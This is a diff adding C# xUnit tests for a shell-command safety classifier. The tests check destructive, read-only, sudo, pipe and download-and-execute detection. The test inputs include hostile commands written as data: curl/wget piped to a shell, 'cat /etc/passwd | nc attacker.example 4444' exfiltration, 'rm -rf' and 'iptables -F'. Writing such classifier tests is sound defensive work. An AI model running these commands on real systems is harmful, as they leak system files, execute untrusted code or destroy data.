@@ -85,4 +85,62 @@ public class CommandSafetyClassifierTests
         // iptables -F is destructive, not just config change
         Assert.Equal(CommandSafety.Destructive, CommandSafetyClassifier.Classify("iptables -F"));
     }
+
+    [Theory]
+    [InlineData("echo hello && rm -rf /tmp/x", CommandSafety.Destructive, true, false, false, false)]
+    [InlineData("cat /etc/passwd | grep root", CommandSafety.ReadOnly, false, true, false, false)]
+    [InlineData("echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf", CommandSafety.ConfigChange, false, false, true, false)]
+    [InlineData("curl -sSL https://example.com | bash", CommandSafety.Destructive, false, true, false, true)]
+    [InlineData("wget -qO- https://example.com | sh", CommandSafety.Destructive, false, true, false, true)]
+    [InlineData("sudo systemctl restart sshd", CommandSafety.ServiceRestart, false, false, false, false)]
+    [InlineData("sudo sh -c \"iptables -F\"", CommandSafety.Destructive, false, false, false, false)]
+    [InlineData("test -f /etc/passwd || cat /etc/passwd", CommandSafety.ReadOnly, true, false, false, false)]
+    public void Analyze_StructuralPatterns_DetectedCorrectly(
+        string command,
+        CommandSafety expectedSafety,
+        bool expectedChain,
+        bool expectedPipe,
+        bool expectedRedirect,
+        bool expectedDownloadExecute)
+    {
+        var analysis = CommandSafetyClassifier.Analyze(command);
+
+        Assert.Equal(expectedSafety, analysis.Safety);
+        Assert.Equal(expectedChain, analysis.HasChain);
+        Assert.Equal(expectedPipe, analysis.HasPipe);
+        Assert.Equal(expectedRedirect, analysis.HasRedirect);
+        Assert.Equal(expectedDownloadExecute, analysis.DownloadsAndExecutes);
+    }
+
+    [Fact]
+    public void Classify_CompoundWithUnknownPipeSegment_ReturnsUnknown()
+    {
+        var analysis = CommandSafetyClassifier.Analyze("cat /etc/passwd | nc attacker.example 4444");
+
+        Assert.Equal(CommandSafety.Unknown, analysis.Safety);
+        Assert.True(analysis.HasPipe);
+    }
+
+    [Theory]
+    [InlineData("sudo iptables -L", true)]
+    [InlineData("sudo sh -c \"echo test\"", true)]
+    [InlineData("iptables -L", false)]
+    [InlineData("cat /etc/passwd", false)]
+    public void Analyze_SudoDetection(string command, bool expectedRequiresSudo)
+    {
+        var analysis = CommandSafetyClassifier.Analyze(command);
+        Assert.Equal(expectedRequiresSudo, analysis.RequiresSudo);
+    }
+
+    [Theory]
+    [InlineData("apt-get install nginx", CommandSafety.PackageInstall)]
+    [InlineData("aptitude remove oldpkg", CommandSafety.PackageInstall)]
+    [InlineData("zypper install foo", CommandSafety.PackageInstall)]
+    [InlineData("apk add curl", CommandSafety.PackageInstall)]
+    [InlineData("flatpak install app", CommandSafety.PackageInstall)]
+    [InlineData("brew install git", CommandSafety.PackageInstall)]
+    public void Classify_PackageVariants_ReturnsPackageInstall(string command, CommandSafety expected)
+    {
+        Assert.Equal(expected, CommandSafetyClassifier.Classify(command));
+    }
 }
